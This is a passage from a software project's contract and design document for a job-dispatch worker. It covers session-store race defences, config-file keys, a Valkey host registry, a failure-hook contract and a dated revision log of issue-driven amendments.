  lands during the copy, because bytes read from it cannot come from a file that replaced the name
  afterwards; that is what closes the A, B, A round trip this entry once stated as a residual the identity
  re-check could only shrink (measured against a live second process, 90 seconds each side of one harness: 23
  of 654 resumes staged an attacker's transcript before, 0 of 115 after). The by-path re-check answers a swap that lands BEFORE the open,
  since every gate above ran by path, so a link planted after the first of those lstats has the whole ladder
  judge the attacker's files and the descriptor then agrees with them; it is also what keeps the venue arm
  reachable, because a promotion that wrote its `(pending)` sentinel and has not yet swapped moves no
  identity at all. Inside that re-check the order is the one #277 set: the key's own SHAPE first, since a
  name that is no longer a directory is neither a venue move nor a swap; then the venue, because a
  cross-venue promotion trips both and `venue-changed` names WHY where `transcript-replaced` only says
  something moved; then the transcript's identity, which catches a same-venue promotion the stamp cannot
  see. A promotion renames a freshly created file into place, so the inode moves on every completed swap.
  **A process killed inside the promotion lock** leaks the lock, as any kill there always has, and until
  ...
  `session_lock_stale_taken` line, logged only after the retake CREATE succeeded because a rival sweeper can
  win the recreate race. An hour is an assertion about storage rather than a derivation, since
  ...
  `session_not_reaped {key, reason: "key-not-a-directory"}`. Until then a link whose target held a readable
...
- **Every read in a key directory is an `lstat` first, regular files only, and every sidecar write goes
  through a rename.** The transcript has been guarded this way since the feature shipped and the
  ...
  **The key DIRECTORY is checked too, and that was the one shape the lstat-per-name rule could not see**
  ...
  it. **The READ path answers the swap with a descriptor rather than a re-check**, and that is what makes
  the refusal above worth stating: the gates ran by path, so a by-path copy after them could stage bytes no
  gate judged, and re-checking by path could not see it -- an attacker who is a symlink DURING the copy and
  the original directory again before the re-check matched every arm (measured against a plain second process
  on the first draft, in the review round's own harness: 195 of 757 successful resumes staged the attacker's transcript and reported `resumed`).
  `resolveSession` now opens the canonical transcript ONCE, judges that descriptor's identity against what the
  gates saw, and streams the staged copy off it, so the bytes a job resumes come off the inode that was
  judged and a later swap can only make it refuse. That closes the A, B, A round trip this contract used to
...
- **Which transcript ownership this contract assumes.** Every file in a key directory -- the transcript, all
  four sidecars, the lock and the in-flight copy -- is created and written by the **worker** user; nothing in
  a container ever writes there, and the store is never mounted. So the lock, its staleness takeover and the
  reaper assume only that the worker owns `PI_SESSIONS_DIR`. The one file whose ownership the worker does NOT
  control is the per-job `/session/current.jsonl`, written by the job user inside the container: promotion
  only ever READS it (`lstat`, then `copyFileSync`), so the assumption is that the worker can read a file the
  container wrote. Under rootless Podman without `--userns=keep-id` that user maps to a subordinate uid on
  the host and the assumption may not hold. **This has not been measured** (`OQ-037`, issue #345). If it does
  not hold the symptom is bounded and loud rather than a corrupt store: the read is refused before the lock
  is taken, so it is a named promotion refusal on every completed run.
- **Write path**, after a `completed` exit **only**: the same `lstat` and size checks on the container's
  output, then an atomic rename under the per-key lock. **The transcript's in-flight copy is named per
  writer** (issue #336): a fixed name was self-cleaning while the lock guaranteed one writer, and a shared
  ...
  widened. **A post-swap sidecar write that fails is logged, never fatal**, because it runs after the
  transcript is already promoted and throwing would report `promote-failed` for a promotion that
  demonstrably happened. **Only the venue stamp needs a sentinel**, and the reason `pi-version` needs none
  is that a failed version stamp is safe in both directions, which is not the same as always true. Where the
  job RESUMED, the surviving stamp already matched its own image's pi and a job runs one image, so it stays
  true of the new transcript. Where the job COLD-STARTED under a new pi, the surviving stamp is FALSE of the
  transcript beside it, and that is still safe, because the next job on that image reads a mismatch and cold
  starts rather than resuming it. With no prior stamp at all the next read cold-starts too. A promotion that knows no version writes an EMPTY stamp rather than
  skipping the write, which `readSidecar`'s size check refuses, so the key cold-starts; skipping would leave
  a previous version beside a transcript an unknown pi wrote. For the chain and context sidecars that
...
- **Producer/Consumer**: The admin extension (operator dialogs + confirm-gated tools) writes; the worker
  ...
  not read it.
- **Location**: `PI_PAUSE_WINDOWS_FILE` (unset = feature off; the worker loads `[]`). Since issue #357
  `pi-dispatch up` SETS it, to the `pause-windows.json` in the folder it runs in, whenever that key has no
  value in an existing `.env` -- so unset stops being the normal state of a converged deployment and
  becomes the state of one that ran `init` and not `up`. Two things follow and neither weakens the
  fail-closed default. The worker's rule is untouched: it still has no cwd default and unset still means
  no windows, because a worker must not start honouring a file nobody pointed it at, least of all one that
  stops paid work. And `doctor`'s warning about this key now reads the deployment's `.env` for this key
  alone, to say whether the SERVICE is configured even though this shell is not, which is the first thing
  in this project to read a `.env` file's contents. Since issue #384 that read also decides a VERDICT rather
  than only the wording of one: doctor runs the worker's own loader on the path the file names, behind a
  regular-file guard, and a deployment whose service cannot start fails the command
  (`REQ-DEPLOYMENT-BOOTSTRAP`). **An EMPTY value is not an unset one** (issue #384). `config.mjs` reads this
  key with `??`, so `PI_PAUSE_WINDOWS_FILE=` survives as an empty string, the loader runs on it
  unconditionally, and the worker REFUSES TO START: the feature is not off, the deployment is down. Doctor
...
- **Location**: `PI_SCOPED_LIMITS_FILE` (unset = no scoped caps and no scoped concurrency; the worker loads
  `[]`). Since issue #357 `pi-dispatch up` sets it to the `scoped-limits.json` in the folder it runs in
  when that key has no value, and `doctor` reads the deployment's `.env` for this key alone -- to reword a
  line where the deployment is merely unconfigured in this shell, and to FAIL where the service itself
  cannot start (issue #384): the same change, the same bounds and the same
  reasoning as `INT-PAUSE-WINDOWS-FILE-CONTRACT` records for its own key, including that the worker's own
  fail-closed default does not move and that an EMPTY value is NOT an unset one: this key is read with `??`
  too, `loadScopedLimits` runs on the empty path, and the worker refuses to start (issue #384). The one-job-per-folder mutex for local jobs is CODE, not configuration: it holds with no file, an
...
- **The operator surface** (issue #230's panel slice, widened by issue #287): a HELD section in the
  ...
  The section is CONDITIONAL and SELF-BOUNDING:
...
**Producer**: every worker, about itself. **Consumers today**: the cron gate
(`cron.mjs -> reconcileGated`), the receiver's router (`route.mjs`), `doctor`, the admin console's fleet
read model (`admin/src/read-model.mjs`) and its host-queue discovery behind the pause switch
(`admin/src/dashboard.ts` -> `fleetQueues`). The gate reaches the keyspace through `registry.livePeers()`;
the other four call the shared `readLiveHosts` directly. This list said "the cron gate, and nothing
else" until issue #302, and had been false since the console started reading the keyspace; it is
corrected here rather than left, because the entry's own reasoning leans on it -- the index leak below is
"handled by the READER", and the reader is now a panel an operator looks at, not only a gate that
abstains.

```
  host:live         SET of worker names -- an index the READER prunes, never a source of truth
  host:h:<name>     HASH, PEXPIRE'd on every beat (15s beat, 90s TTL = six missed beats)
    name            the worker's name; redundant with the key so a row is self-describing when pasted
    version         the worker package version, so a rolling upgrade is a visible fact
...
an operator screenshots, and `doctor` prints these rows. A value that must be carried but cannot satisfy
the rule is HASHED before it arrives (`scopeKeyPrefix`'s idiom), never abbreviated. A test asserts that no
value is path-shaped, so the day someone publishes `logsDir` is the day that test goes red.

**`tz` is here because a cron pattern has no timezone.** `triggers.json` carries no `tz` field on a cron
entry and BullMQ hands the pattern to cron-parser with no zone, so it resolves in each worker's LOCAL
...
reversal is correct because the OBJECT differs: a COUNTER whose TTL refreshes on every increment stops
being a window, while a LEASE's expiry IS its liveness claim, so refreshing it is the mechanism rather
than a leak. The in-repo precedent is lease-shaped -- `wait-state.hold` re-`PEXPIRE`s the supersede lease,
and only after checking the lease is still its own, which this key gets for free by being named after its
only writer.

**A clean shutdown DELETES the row** rather than letting it expire, so the TTL only ever covers a crash
and a rolling restart leaves no ghost peer behind. `wait-state.release` takes the same posture.

**Once `close()` has been ENTERED, this module writes no log line and adds nothing back to the index**,
and the flag rather than the drain is what delivers it (issue #302). `close` drains with one
`bounded(inFlight, timeoutMs)` while `write` spends one bound per command, so a write can outlive the
drain: measured against a stalled Valkey, `host_registry_unreachable` landed 76ms and
`host_registry_restored` 108ms after `close()` had RESOLVED, through the closure of a boot that had
stopped, and a late `SADD` put the name back into `host:live` 40ms after the same `close`'s `SREM` took it
out. The drain deliberately stays at one `timeoutMs`, because widening it to `write`'s worst case would
triple a shutdown bound whose whole point is to be short; both of `beat`'s transition arms and the `SADD`
are gated on `closed` instead. This is `DES-WATCHERS-CLOSE-WITH-THE-WORKER`'s rule reached from the other
side: work already in flight cannot be recalled, so what a close gates is its VOICE.

Of the module's three log sites, two are gated and the third **cannot be late**, which is what makes the
absolute wording above true rather than approximate: `host_registry_field_refused` is emitted by `write`'s
field loop, which runs synchronously inside `beat`'s own entry check before the first `await`. The `PEXPIRE`
is deliberately NOT gated beside the `SADD`, and the asymmetry is the point. The `SADD` is an index write
that `close`'s `SREM` undoes, so repeating it after a close resurrects a ghost; the `PEXPIRE` is the row's
own fuse, and skipping it on a close that landed between the `HSET` and the `PEXPIRE` leaves
`host:h:<name>` with NO expiry at all. That row is invisible, because every reader walks `host:live` and
the `SREM` emptied it, so it is a keyspace leak rather than a ghost peer and the reader's prune never
reaches it. The fuse is only as good as the write that lights it, and that bound predates this change: a
FIRST beat whose `HSET` landed while its reply was lost past the bound dies before the `PEXPIRE` is ever
issued, so a `DEL` lost at shutdown leaves the same TTL-less row with or without any gate -- measured on a
live server, `PTTL -1` on the pre-#302 code and the fixed code alike. A server-outage residual of the
bounded-write design, recorded beside the fix so the asymmetry above is not read as a guarantee.

**The index leak is handled by the READER**, exactly as `wait:held`'s is and for the measured reason
recorded there: a SET cannot expire its members, and the alternative -- no index and a `SCAN host:h:*`
instead -- walks HARDEST on deployments with nothing to show, because the early exit never fires, while
the panel reads every second.
...
## INT-ON-FAILURE-HOOK-CONTRACT

**Producer**: the worker's two terminal listeners (start.mjs). **Consumer**: ONE operator-named command
(`PI_ON_FAILURE`, absolute path, boot-refused otherwise; issue #288). The operator wires the transport;
this project never grows one.

- **Invocation**: the worker spawns the named path with id-only argv --
  `<jobId> <outcome> <reason> <host>` -- never a title, a body, or any payload text
  (`CONST-ISSUE-TEXT-IS-DATA`). `shell: false`, an argv array, ALL THREE stdio streams `ignore` --
  nothing is entitled to read a notification's output, which is one subtraction beyond the wait check's
  byte counters, and with no pipes the backgrounded-grandchild EOF hazard cannot arise (the listener is
  still `exit`). It runs on the HOST as the worker, with the worker's environment: this is not a weaker
  blast radius than `--env-setup`, it is the same one at a different time, and what bounds it is that
  the operator named the script in a file only they can write.
- **The reason is shape-guarded at the spawn**, the single normalizing door: a value that does not match
  `^[a-z0-9-]{1,40}$` flattens to `infra` before it can become argv, because `InfraRetry.reason`
  defaults to the whole message when no token was given and messages carry library words. Argv[1..3]
...
- **Fires for the paid terminals only**: outcome `failed` at the TERMINAL failed event (`finishedOn`
  ...
  exists for. It fits the reason shape, so it crosses into argv as itself. The hook's set SPREADS the
  worker's `RUNNER_POLICY_REASONS` rather than listing its members, so every named runner reason pages
  as `runner-policy` did before it had a label. Never for completions,
...
- **At most once per job, best effort, and NOTHING flows back**: the hook cannot change an outcome
  ...
  `exit|timeout|signal-*|spawn|unresolvable|argv-unusable` -- and are otherwise unread (`OQ-034`).
  Timeout `PI_ON_FAILURE_TIMEOUT_MS` (default 10s), then SIGTERM and SIGKILL after a 2s grace, every
  timer unref'd. The executable is resolved at FIRE time (realpath + the executable bit), so a script
  installed mid-day works and one deleted mid-day logs `unresolvable` rather than pretending.
- **Unset is absence**: no construction, no spawn, no log line, byte-identically -- the falsification
  test is a deployment diff with the variable unset, which must be empty.

**Code evidence**: worker/src/on-failure.mjs -> makeOnFailure; worker/src/start.mjs -> the
completed/failed listener bodies, HOOK_POLICY_REASONS; worker/src/config.mjs -> parseOnFailure,
onFailureTimeoutMs; worker/test/on-failure.test.mjs; worker/test/start-wiring.test.mjs.
...
| 2026-08-31 | Issue #57. **`INT-HOST-REGISTRY-CONTRACT` AMENDED**: a `caps` field, the comma-separated `<class>:<name>` tokens for the secret (`s:`) and wait (`w:`) profiles this host declares, recomputed per beat rather than frozen at boot so a host that gains a profile on restart starts attracting that work within one beat and one that loses it stops. `g:` is reserved for forge credentials, the highest-value follow-on, because that failure is an `UnrecoverableError` rather than a policy return. The field carries NAMES and never the resolver paths behind them, which is the row's existing content rule (names, integers and digests) rather than a new one, and the charset both profile parsers already enforce excludes the comma and the colon, so the join and the split are both unambiguous. A reader re-validates every token rather than trusting it: the row is written by another process and the value decides where money-spending work goes. `INT-TRIGGERS-FILE-CONTRACT` **UNCHANGED, checked**: no trigger field is added, removed or reinterpreted -- routing reads two fields that already exist and changes nothing about how they are written or validated. `INT-RUN-HISTORY-FILE-CONTRACT` **UNCHANGED, checked**: a routed job's record is identical to an unrouted one's, and `host` already names where it ran. |
| 2026-08-31 | Issue #57, Gap 3. **`INT-RUN-HISTORY-FILE-CONTRACT` AMENDED** with a second, non-durable REPRESENTATION of the same record: `runs:rec:<sanitizedJobId>` holds the sidecar's own bytes under a PX no longer than the file retention, and `runs:index` is a ZSET of sanitized jobId to the run's end (or start) in millis, trimmed by the writer both by age and by count and rolled by PEXPIRE on every write. SANITIZED IN THE KEYSPACE, RAW ONLY INSIDE THE BODY -- the file contract's own split, restated in Valkey, which is what lets a fleet-wide listing be one `ZREVRANGEBYSCORE` plus one `MGET` with no second id space. The file remains the record and this is explicitly a view: it is written STRICTLY AFTER the file, because a crash between the two must leave a record with no fleet row rather than a fleet row with no record. The PII-free-by-construction property transfers by construction rather than by re-argument, since the bytes are identical. A reader must treat `off` and `unreachable` as different facts: the first is what a single-host deployment and a fleet still below the version floor both look like, the second is not knowing. **`INT-HOST-REGISTRY-CONTRACT` UNCHANGED, checked**: the mirror is its own keyspace and publishes nothing into `host:`. **`INT-CONTAINER-JOB-INPUTS` UNCHANGED, checked**: `previousRunAt` still comes from local files and is still correct, because cron is routed to one host. |
| 2026-09-07 | Issue #295. **`INT-PAUSE-WINDOWS-FILE-CONTRACT` UNCHANGED, checked**: its Write protocol promises that the worker's directory watch hot-swaps the windows on change and keeps the last-good set on a bad edit, and its acceptance names `pause_windows_reload_invalid`; both hold byte for byte. The contract says what a FILE CHANGE does and has never said anything about when the watch ends, which is precisely why a watch that never ended contradicted nothing. **`INT-SCOPED-LIMITS-FILE-CONTRACT` UNCHANGED, checked**, and it is the stronger case: its own Enforcement section already declares `worker_started`'s two fields and the four `scoped_limits_*` watcher events LOG-ONLY, telemetry and not contract, nothing may parse them -- so a watch that stops emitting them at shutdown breaks no consumer by that entry's own terms. **`INT-HOST-REGISTRY-CONTRACT` UNCHANGED, checked, and cited as the precedent**: its "a clean shutdown DELETES the row rather than letting it expire" is the same rule one layer down, and its note that the registry bound's timer is deliberately NOT unref'd states from the opposite direction the distinction the new design entry rests on -- unref'd means only that a handle will not hold the loop open, never that anything cleaned it up. **Code evidence**: worker/src/start.mjs -> makeWatchCloser; worker/src/index.mjs -> createWorker (shutdown). |
| 2026-09-07 | Issue #290. **`INT-RUN-HISTORY-FILE-CONTRACT` AMENDED** (the `logsDir` line only): `empty/unset` now resolves to `<home>/.pi-dispatch/logs`, a durable per-user state root rather than the OS temp dir, with the pre-existing temp path kept as the fallback for a host that cannot name a home -- and `doctor` says so in one line when that fallback fires, which is what keeps the degradation visible instead of silent. The record SHAPE, the filename grammar and the `previousRunAt` scan are all untouched. **`INT-CONFIG-OVERLAY-CONTRACT` AMENDED** the same way and for the same reason, keeping its "same convention as PI_LOGS_DIR" pairing true; no key, no validation rule and no write protocol moved. **`INT-DEPLOYMENT-POINTER-CONTRACT` UNCHANGED, checked, and the check is load-bearing**: `POINTER_ENV_ALLOWLIST` already carried `PI_LOGS_DIR` and `PI_SETTINGS_FILE`, so the wizard emitting them needed no contract change -- and the comment that had excluded them ("they default to absolute OS-temp locations") was the argument FOR emitting them once that stopped being true, since a per-account default is exactly what the pointer exists to reconcile. **`INT-SESSION-STORE-CONTRACT` UNCHANGED, checked**: `PI_SESSIONS_DIR` still has no default, on its own pre-spend-refusal reasoning rather than on the temp-directory one it used to be paired with in the docs. **Code evidence**: worker/src/config.mjs -> logsDirPath, settingsFilePath; admin/src/read-model.mjs -> resolvePaths; admin/src/deployment-pointer.mjs -> POINTER_ENV_ALLOWLIST. |
| 2026-09-07 | Issue #292. **`INT-SANDBOX-CONTRACT` AMENDED**, two clauses. Its Retention bullet said "Swept at worker boot", which is now "at boot and every `PI_SWEEP_INTERVAL_HOURS` thereafter" -- and the consequence is stated rather than left to be derived: the window is a FLOOR, so a directory dies on the first sweep AFTER it closes and the effective ceiling is the window plus the interval, up to 48 hours at both defaults. Its "the sweep asks docker first" bullet gains the scope of a failed lookup: it skips ONE sweep, not the feature, because `makeSandboxReaper` declares `running` inside its returned function and re-issues `listRunning` every call, so a docker outage costs one interval of overshoot rather than latching retention off until the next boot. **`INT-SESSION-STORE-CONTRACT` UNCHANGED, checked, and the check is the load-bearing one**: its read-path gate is `mtime within PI_SESSIONS_TTL_DAYS` evaluated at OPEN, and a periodic reaper reads exactly the same mtime the boot one did, so no gate, no order and no eligibility bound moved -- what changed is only how often the DISK half runs. **`INT-RUN-HISTORY-FILE-CONTRACT` UNCHANGED, checked**: the record shape gains no field and the filename grammar is untouched; `PI_LOG_RETENTION_DAYS` still bounds the `previousRunAt` scan, just on a timer as well as at boot. **Code evidence**: worker/src/sandbox-store.mjs -> makeSandboxReaper; worker/src/retention-sweep.mjs -> makeRetentionSweep. |
| 2026-09-07 | Issue #286, `doctor`'s provider-key check. **`INT-CONTAINER-RUNTIME-CONTRACT` AMENDED**, three bullets beside the existing derived-provider-key rule, which was already right and was already being ignored one file over. The rule said the key variable is derived from pi's table "never hardcoded", and named a hand-maintained copy as "exactly the reinvention `no-reimplementing-pi` forbids"; `worker/src/doctor.mjs` held one anyway, and it had drifted to an invented variable (`GOOGLE_API_KEY`, which appears in NO pi table at the pin) and an invented provider (`gemini`, absent from the 35 ids `getBuiltinProviders()` returns). What was missing from the entry was WHY the copy looked necessary: `doctor` asks a different question from the container path. The container path needs the keys the host HOLDS, which `findEnvKeys(provider, hostEnv)` answers completely; `doctor` has to NAME a variable that is not set, which that call cannot do, because it filters by presence and returns one `undefined` for both "no such provider" and "nothing set". Both halves are now stated: `providerKeyCandidates` recovers pi's own list by calling `findEnvKeys` against an environment where every variable is present, so the filter is the identity and no copy of the table exists anywhere; and the presence test is made against the injected env BY THIS PROJECT, never by pi, because `getProviderEnvValue` falls back to the real `process.env` and would otherwise report the machine `doctor` runs on rather than the deployment it is diagnosing -- a hermeticity trap that also silently affects any test injecting a fake env, so it is pinned in both directions. The question ORDER is stated as load-bearing: candidates first, catalog second, because `radius` has a real key variable and no catalog entry, so asking membership first would call a working configuration unknown. And the one credential fact that stays hand-written is argued rather than assumed -- "this variable is an OAuth token" is a claim about a credential that must NOT be used, so it cannot come from a table of the ones that work; it is a suffix rule rather than a name set because the expensive direction is the false green. **Evidence (upstream) EXTENDED** at the pin with `getProviderEnvValue`'s `env?.[name] \|\| process.env[name]` (an injected env is a preference, not an isolation boundary) and `findEnvKeys`'s conflated `undefined`. **`INT-SDK-SESSION-OPTIONS` UNCHANGED, checked**: no session option, mount or flag moves; the container receives exactly the same variables it did, by the same construction. **`INT-RUN-HISTORY-FILE-CONTRACT` UNCHANGED, checked**: no field is added, and no refusal reason changes -- the pre-spend refusal a misconfigured provider gets is the same one, arriving after a `doctor` that now predicts it. **`INT-TRIGGERS-FILE-CONTRACT` KNOWN-INCOMPLETE, not amended here**: its pre-spend `secret-name-reserved` refusal reads `providerKeyVars`, which is presence-filtered, so a trigger may bind the provider's own credential variable as a secret whenever the credential comes from `auth.json` rather than the environment -- the same conflated `undefined` this row is about, one module over, and named here rather than left for a reader of that entry to discover is false. **Code evidence**: worker/src/env-allowlist.mjs -> providerKeyCandidates, piProviders, EVERY_VAR_SET; worker/src/doctor.mjs -> providerKeyCheck, noKeyVariableCheck, defaultProviderOracle, OAUTH_KEY_RE; worker/test/env-allowlist.test.mjs; worker/test/doctor.test.mjs. |
| 2026-09-07 | Issue #286's sweep, a correction found by auditing the tables this repo hand-maintains. **`INT-TRIGGERS-FILE-CONTRACT` CORRECTED, and the correction is that a previous revision row of this file was false**: the 2026-07-31 row records `INT-TRIGGERS-FILE-CONTRACT` gaining "two more per-forge action vocabularies" for Forgejo and Azure, and the entry body never gained them -- it named `github` and `gitlab` and stopped, with an orphaned line break where the third and fourth belonged. So the file that `CLAUDE.md` calls the authority carried a two-forge vocabulary while four forges shipped, and its own history asserted otherwise. Both are added now, in each forge's own words, with the two absences that are DECISIONS rather than omissions stated beside them: Forgejo's `label_cleared`, excluded because removing a label must never start a paid run, and Azure's missing close word, which is why an azure close rule is refused outright rather than left to never match. **This is the same defect class as the entry it corrects**: an operator or an agent reading this contract to learn what a trigger may say would have concluded that two of the four shipped forges accept no pull-request actions at all -- "a different failure from being refused: they simply never try", which is `admin/src/index.ts`'s own words about the same vocabulary one layer up. **`INT-AZURE-PAYLOAD-SUBSET` UNCHANGED, checked**: the projected subset does not move, and it is cited here as the reason Azure has no close word rather than amended. **`INT-RUNNER-EXIT-CODE-PROTOCOL` UNCHANGED, checked**: `EXIT_POLICY`'s meaning and the throw-vs-return mapping are untouched; what this slice adds is tests asserting that the copies of the number outside the worker follow the constant rather than a literal. **`INT-CONFIG-OVERLAY-CONTRACT` UNCHANGED, checked**: `KNOWN_KEYS` gains no member and the overlay's shape does not move; the admin's settings view now iterates that array instead of a retyped copy of it. **Code evidence**: worker/src/triggers.mjs -> PR_ACTIONS (the vocabulary this entry restates); receiver/test/filter-vocabulary.test.mjs; admin/test/wiring.test.mjs. |
| 2026-09-08 | Issue #311, the variable an `auth.json` login is written under. **`INT-CONTAINER-RUNTIME-CONTRACT` AMENDED**, three clauses. The contract already said the key variable is derived from pi's table and never hardcoded, and `resolveEnvName` obeyed the letter of it while breaking the point: it asked pi's `findEnvKeys` oracle, but with candidates it generated itself from a convention (`<PROVIDER>_API_KEY`/`_KEY`) plus the credential's `env` field. The convention is wrong for 13 of the 34 provider ids that have a key variable at the pin, measured rather than asserted (`google` reads `GEMINI_API_KEY`, `huggingface` `HF_TOKEN`, `moonshotai` `MOONSHOT_API_KEY`, `github-copilot` `COPILOT_GITHUB_TOKEN`, `radius` `PI_GATEWAY_API_KEY`); it is right for the other 21, `anthropic` and `openai` among them, which is what let it survive. For the 13, pi recognised nothing, the resolver returned `null`, and a valid `pi login` refused every job with "could not determine the environment variable pi expects". The `env` candidate was inert besides: at the 0.80.7 pin `ApiKeyCredential.env` is a `Record<string, string>` of provider config (Cloudflare account and gateway ids), never a variable name, so the string filter dropped it on every call. Now `apiKeyVariable(providerKeyCandidates(provider))`, which is pi's own list with the one credential fact applied. **That fact and its selection MOVED** out of `doctor.mjs` into the import-free `worker/src/provider-key.mjs`, because the two callers must agree: `doctor` names a variable for an operator to set and the worker writes one into a container, and a mismatch is a green setup line pointing at a name no job uses, which is #286 one module over. `providerKeyCandidates(provider)[0]` was checked and REJECTED as the fix: for `anthropic` pi's precedence puts `ANTHROPIC_OAUTH_TOKEN` first, so it would write an api-key credential under the subscription-login name, the one name `doctor` refuses to print. It would not have broken auth (pi maps both names to the same `apiKey` slot and the Anthropic API path branches on the key's VALUE, testing for `sk-ant-oat`), which is what makes it the dangerous kind of wrong. **Third clause NEW**: on the env path the names come from pi and the values come from the env the resolver was handed. One `findEnvKeys(provider, hostEnv)` call answered both, and its presence test falls back to the real `process.env`, so a name could be present on the strength of the machine and then read out of an env that does not carry it, giving `{ NAME: undefined }` with no fall through to the login that would have worked. It now asks the hermetic `providerKeyCandidates` and filters by the given env, the same set by construction. **Reachability, corrected by an adversarial pass rather than left overstated**: in the shipped worker `hostEnv` IS `process.env` and the old code was a no-op, so this is a DI-seam fix, not a production incident; the seam is the module's whole test surface and a test that failed only on a laptop exporting `HF_TOKEN` is how it surfaced. `INT-SANDBOX-CONTRACT` UNCHANGED, checked: it builds its own env and does not call this resolver. `INT-TRIGGERS-FILE-CONTRACT` UNCHANGED here, checked, but its EXPOSURE grew and saying only "unchanged" would understate it: the clause is the same, and the population it fails to protect is 12 providers larger, because those 12 could not reach the `auth.json` path at all before this change. Issue #309 owns that gate and lands next. **The #286 row below is superseded in one sentence**, left in place as history rather than rewritten: "which `findEnvKeys(provider, hostEnv)` answers completely" was already false when written, for the reason this row gives. **Four more clauses, all found by the adversarial pass on this change and all made reachable BY it**, since twelve providers could not take the `auth.json` path before: a stored key is a pi CONFIG VALUE (`!cmd` runs a shell command, `$VAR` interpolates) and an env variable is read raw, so a non-literal login is refused rather than forwarded as its own source text; `cred.key` must be a string, because the truthiness guard let an object reach a paid container as `[object Object]`; `cred.env` companion settings are refused when they will not arrive, which is `no auth at all` for both Cloudflare providers; and the no-key-variable refusal now splits pi-authenticates-another-way from not-a-provider-pi-has instead of telling an `amazon-bedrock` operator to set a variable that does not exist. `doctor` gained the matching reads, including a `typeof` guard on a line that sits outside its own try and took the whole run down on a non-string key. **Code evidence**: worker/src/provider-key.mjs -> OAUTH_KEY_RE, apiKeyVariable; worker/src/env-allowlist.mjs -> resolveEnvName, resolveProviderCredential, credentialFromPiAuth; worker/src/doctor.mjs -> providerKeyCheck; worker/test/provider-key.test.mjs; worker/test/env-allowlist.test.mjs; worker/test/doctor.test.mjs. |
| 2026-09-08 | Issue #309, the reserved-name gate under the `auth.json` credential path. **`INT-TRIGGERS-FILE-CONTRACT` AMENDED** (the pre-spend refusal clause) and **no longer KNOWN-INCOMPLETE**, closing the row #286 left open two rows above. `secret-name-reserved` now reserves every variable pi reads for the job's provider, set on this host or not, because what a trigger may not NAME is a property of the provider; the presence-filtered form was EMPTY on every deployment whose credential comes from pi's `auth.json`, which is the default, and `?? []` made that silent. The OAuth variable is reserved with it: no ordinary host sets it, so a presence filter never held it, and pi reads it first. Bounded to the job's own provider, tested, so another provider's variable stays bindable. **`INT-CONTAINER-RUNTIME-CONTRACT` UNCHANGED, checked**: the container env is assembled exactly as before and in the same order; this changes only which names a trigger may propose, one layer up. Its ordering paragraph already called ordering "the BACKSTOP, not the gate" and named this gate as the gate, which is now true. **`INT-RUN-HISTORY-FILE-CONTRACT` UNCHANGED, checked**: no new reason token and no new field, the same `secret-name-reserved` under `outcome: "policy"`, reached more often. **`INT-SANDBOX-CONTRACT` UNCHANGED, checked**: a resurrected sandbox builds its own env and never calls this gate; it carries `TERM`, `TMOUT` and, when an egress policy is armed, the three proxy variables, and no secrets at all. **Wiring rider**: `start.mjs` was building the secrets resolver without `hostEnv`, so its resolver subprocess inherited `process.env` while `buildContainerEnv` beside it read `startWorker`'s injected `env` -- identical on the real path, divergent under an injected one, which is the hazard that file already calls out by name for `sessionsDir`. **`REQ-DEPLOYMENT-BOOTSTRAP`'s rule applied one field over**: `doctor` gains a check for a trigger binding a variable pi reads for this deployment's provider, using the same oracle the gate uses through the same dynamic import. It is answerable at setup ONLY because the gate stopped depending on host state; the presence-filtered version's answer would have changed with the machine `doctor` ran on. Without it the operator's first notice was a public refusal on a live delivery, which is the shape #286 exists to prevent. **`INT-TRIGGERS-FILE-CONTRACT` also gains one load-time refusal**: `__proto__` as a `run.secrets` key. It passes `ENV_NAME`, is in no reserved set, and is the one name that cannot be carried: `JSON.parse` gives it as an own property, but every later hop assigns with `=` into a plain object and hits `Object.prototype`'s setter, so the resolver runs against the operator's vault and the container still gets no variable, on a clean exit. Refused at load, where a name that cannot be carried is a fact about the file. **Code evidence**: worker/src/secrets.mjs -> makeSecretsResolver reserved set; worker/src/triggers.mjs -> validateSecrets; worker/src/doctor.mjs; worker/src/processor.mjs -> the refusal text; worker/src/start.mjs; worker/test/secrets.test.mjs; worker/test/processor.test.mjs; worker/test/triggers.test.mjs; worker/test/doctor.test.mjs; worker/test/start-wiring.test.mjs. |
| 2026-09-08 | Issue #310, the configuration class on the wrong side of `CONST-RETRY-INFRA-ONLY`. **`INT-RUN-HISTORY-FILE-CONTRACT` AMENDED**: the `reason` enum gains `provider-unconfigured` (the free pre-spend credential gate) and `config-refused` (the catch's classifier for any other `piDispatchConfig` throw). Both ride the EXISTING `outcome: "policy"` and neither is a new outcome, because the admin surfaces bucket outcomes into a closed set and silently drop unknowns (`admin/src/costs.mjs`, `admin/src/insights-html.mjs`) or paint them red (`admin/src/dashboard.ts`), while `reason` is a passthrough everywhere. A run that previously recorded `outcome: "failed"`, `reason: null`, `budgetReserved: null` for a configuration fault now records a determinate policy refusal with `budgetReserved: false`, and the raw message no longer becomes the queue's `failedReason`, which mattered because several of `credentialFromPiAuth`'s messages carry `auth.json`'s path (no count is given here on purpose: it was three when the sentence was drafted and five by the time it was reviewed, which is the hand-maintained-number drift this project keeps deleting). **`INT-CONTAINER-RUNTIME-CONTRACT` UNCHANGED, checked**: the container env is assembled by the same code from the same inputs; what changed is that the same resolution is PROBED earlier, and the probe discards its result rather than threading a live credential through the processor. **`INT-RUNNER-EXIT-CODE-PROTOCOL` UNCHANGED, checked**: this is entirely host-side and no container exit code is reinterpreted. **`INT-TRIGGERS-FILE-CONTRACT` UNCHANGED, checked**: no field, no load-time refusal and no pre-spend reason of its own moves. **Two stale in-code claims made true rather than deleted**: `run-container.mjs` and `env-allowlist.mjs` both said "the processor turns that into a pre-spend refusal", which was aspirational while the processor did not read the tag at all. **Two surface changes worth recording because neither is in the record shape.** The refusal now posts a PUBLIC comment where the old rethrow posted none, once per delivery with no dedup, which is the same cadence every other policy refusal in the processor already keeps. And a deployment with a dead credential no longer grows BullMQ's failed count, because the job completes: `admin/src/dashboard.ts`'s `statusHeader` reads that count directly, so the queue-level red indicator is replaced by the per-run amber row and the issue comment. **NEITHER refusal puts a message in the log**, which the first draft did: `credentialFromPiAuth` names `auth.json`'s absolute path, `prepare-local.mjs` names the operator's folder (which `buildRecord` reduces to a basename precisely because a host path carries an OS account name), and `branch.mjs` interpolates a forge PAYLOAD field, which no-pii-in-logs forbids outright. The provider is named on both surfaces, being operator-authored config the record already carries. `doctor` is where the specific variable and path are printed. **Code evidence**: worker/src/processor.mjs; worker/src/start.mjs; worker/src/run-container.mjs; worker/src/env-allowlist.mjs; worker/test/processor.test.mjs; 